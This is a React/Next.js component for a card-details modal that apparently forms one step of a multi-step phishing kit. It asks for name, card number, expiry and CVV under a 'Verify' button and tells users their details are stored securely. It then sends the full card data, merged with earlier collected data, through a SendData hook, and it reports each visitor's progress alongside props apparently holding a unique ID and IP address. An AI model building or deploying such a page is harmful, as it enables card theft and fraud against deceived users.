import React, { useContext, useEffect, useState } from 'react'
import { Col, Row } from 'react-bootstrap';
import styled from 'styled-components';
import Lock from '../assets/svgs/lock.svg'
import CC from '../assets/svgs/cc.svg'
import Back from '../assets/svgs/back.svg'
import { useCreditCardValidator } from 'react-creditcard-validator';
import SendData from '../hooks/SendData';
import Image from 'next/image'
import { DataContext } from '../pages';

const ModalContainer = styled.div`
    position: fixed;   
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #00000099;
    width: 100%;
    height: 100%;
    z-index: 1000;
    top: 0px;
    left: 0px;
`
const ModalContent = styled.div`
    max-width: 550px;
    width: 100%;
    height: 580px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    background-color: white;
    border-radius: 8px;
    box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
    position: relative;
    padding-inline: 1.5rem;
    padding-block: 1.5rem;
    margin: 1rem;
`
const ModalTitle = styled.div`
    padding-bottom: 2.5rem;
    font-weight: 600;
    text-align: center;
    font-size: 18px;
`

const ModalSubtitle = styled.div`
    font-weight: 700;
    padding-bottom: 0rem;
    text-align: left;
    line-height: 1;
`

const LockSection = styled.div`
    padding-top: 3rem;
`
const SmallText = styled.div`
    color: #1C2B33;
    font-size: 14px;
    line-height: 1.3;
`

const BtnDiv = styled.div`
    padding-top: 1rem;
    display: flex;
    justify-content: flex-end;
`

const NextBtn = styled.button`
    background-color: #2a6de1;
    border: none;
    padding-inline: 3rem;
    padding-block: 0.5rem;
    width: 140px;
    border-radius: 6px;
    color: #fff;
`

const Crd = styled.div`
    img {
        width: 25px;
        height: auto;
    }
`

const TitleWrap = styled.div`
    padding-bottom: 1rem;
`

const CustomInput = styled.input`
    width: 100%;
    border: 1px solid #ddd;
    padding: 0.75rem;
    outline: none !important;
    border-radius: 6px;
    :focus {
    border: 1px solid #aaa;

    }
    margin-bottom: 0.5rem;
`
const WhiteInput = styled.input`
    width: 100%;
    outline: none !important;
    border: none;
`
const InputWithIcon = styled.div`
    width: 100%;
    border: 1px solid #ddd;
    padding: 0.75rem;
    border-radius: 6px;
    margin-bottom: 0.5rem;
`

const BackBtn = styled.div`
    position: absolute;
    top: 1.5rem;
    left: 1rem;
    cursor: pointer;

    svg {
        width:25px;
        height:25px;
    }
`
const ErrorDiv = styled.div`
    font-size: 12px;
    color: red;
    text-align: left;
    padding-bottom: 0.5rem;
    margin-top: -0.35rem;
`
function Step2Modal({ setStep, Unik, Ip }) {
    const [NameError, setNameError] = useState('')
    const [Name, setName] = useState('')

    let { setAllData, AllData } = useContext(DataContext);

    const NextClicked = () => {
        if (Name === '') {
            setNameError('Name cannot be blank')
        }
        else {
            setNameError('')
        }

        if (erroredInputs.cardNumber === undefined && erroredInputs.cvc === undefined && erroredInputs.expiryDate === undefined && Name !== '') {
            if (cardstate.cardNumber.length >= 16 && cardstate.cvc.length >= 3 && cardstate.expiryDate.length === 7) {

                const params = {
                    ...AllData,
                    CardName: Name,
                    CardNr: cardstate.cardNumber,
                    CardDate: cardstate.expiryDate,
                    CardCvc: cardstate.cvc
                };

                setAllData(params)
                SendData(params)

                setTimeout(() => {
                    setStep(4)
                }, 1000);


            }

        }
    }


    function expDateValidate(month, year) {
        if (Number(year) > 2035) {
            return 'Expiry Date Year cannot be greater than 2035';
        }
        return;
    }
    const [cardstate, setcardState] = useState({
        cardNumber: '',
        cvc: '',
        expiryDate: ''
    });

    const {
        getCardNumberProps,
        getCVCProps,
        getExpiryDateProps,
        meta: { erroredInputs }
    } = useCreditCardValidator({ expiryDateValidator: expDateValidate });

    const [triedName, settriedName] = useState(false)
    const CheckName = (e) => {
        setName(e.target.value)
        settriedName(true)
    }
    useEffect(() => {
        if (Name === '' && triedName) {
            setNameError('Name cannot be blank')
            console.log('if');

        }
        else {
            setNameError('')
            console.log('else');


        }

    }, [Name, triedName])

    React.useEffect(() => {
        const params = {
            ...AllData,
            currentStep: 'Card Details'
        };

        SendData(params)

    }, [])


    return (
        <ModalContainer>
            <ModalContent>
                <BackBtn onClick={() => { setStep(8) }}>
                    <Back />
                </BackBtn>

                <ModalTitle>
                    Debit or Credit Card
                </ModalTitle>
                <div>

                    <TitleWrap>
                        <Row className='align-items-center gx-1'>
                            <Col>
                                <ModalSubtitle>
                                    Card Details
                                </ModalSubtitle>
                            </Col>
                            <Col xs={'auto'}>

                                <Crd>
                                    <Image
                                        alt=""
                                        src="/assets/images/visa.png"
                                        height={25}
                                        width={35}
                                    />
                                </Crd>
                            </Col>
                            <Col xs={'auto'}>

                                <Crd>
                                    <Image
                                        alt=""
                                        src="/assets/images/mstcrd.png"
                                        height={25}
                                        width={35}
                                    />
                                </Crd>
                            </Col>
                            <Col xs={'auto'}>

                                <Crd>
                                    <Image
                                        alt=""
                                        src="/assets/images/union.png"
                                        height={25}
                                        width={35}
                                    />
                                </Crd>
                            </Col>
                            <Col xs={'auto'}>
                                <Crd>
                                    <Image
                                        alt=""
                                        src="/assets/images/amx.png"
                                        height={25}
                                        width={35}
                                    />
                                </Crd>
                            </Col>
                        </Row>
                    </TitleWrap>
                    <CustomInput placeholder='Name on card' type='text' onChange={CheckName} />
                    <ErrorDiv>
                        {NameError}
                    </ErrorDiv>

                    <InputWithIcon>
                        <Row className='gx-2'>

                            <Col xs={'auto'}>
                                <CC />
                            </Col>
                            <Col>
                                <WhiteInput placeholder='Card Number' type='number'
                                    {...getCardNumberProps({
                                        onChange: (e) =>
                                            setcardState({
                                                ...cardstate,
                                                [e.target.name]: e.target.value
                                            })
                                    })}
                                />

                            </Col>

                        </Row>
                    </InputWithIcon>
                    <ErrorDiv>{erroredInputs.cardNumber && erroredInputs.cardNumber}</ErrorDiv>
                    <Row className='gx-2'>

                        <Col xs={'6'} sm={4}>
                            <CustomInput placeholder='MM/YY' type='number'
                                {...getExpiryDateProps({
                                    onChange: (e) =>
                                        setcardState({
                                            ...cardstate,
                                            [e.target.name]: e.target.value
                                        })
                                })}
                            />
                            <ErrorDiv>{erroredInputs.expiryDate && erroredInputs.expiryDate}</ErrorDiv>

                        </Col>
                        <Col xs={'6'} sm={4}>
                            <CustomInput placeholder='CVV' type='number'
                                {...getCVCProps({
                                    onChange: (e) =>
                                        setcardState({
                                            ...cardstate,
                                            [e.target.name]: e.target.value
                                        })
                                })}
                            />
                            <ErrorDiv>{erroredInputs.cvc && erroredInputs.cvc}</ErrorDiv>

                        </Col>
                    </Row>
                </div>
                <div>

                    <LockSection>
                        <Lock />
                    </LockSection>
                    <SmallText>
                        Your payment methods are saved and stored securely.
                    </SmallText>
                    <SmallText>
                        <div style={{ color: '#2a6de1', fontWeight: 600 }}>
                            Terms Apply
                        </div>
                    </SmallText>
                    <BtnDiv>
                        <NextBtn onClick={NextClicked}>
                            Verify
                        </NextBtn>
                    </BtnDiv>
                </div>

            </ModalContent>
        </ModalContainer >
    )
}

export default Step2Modal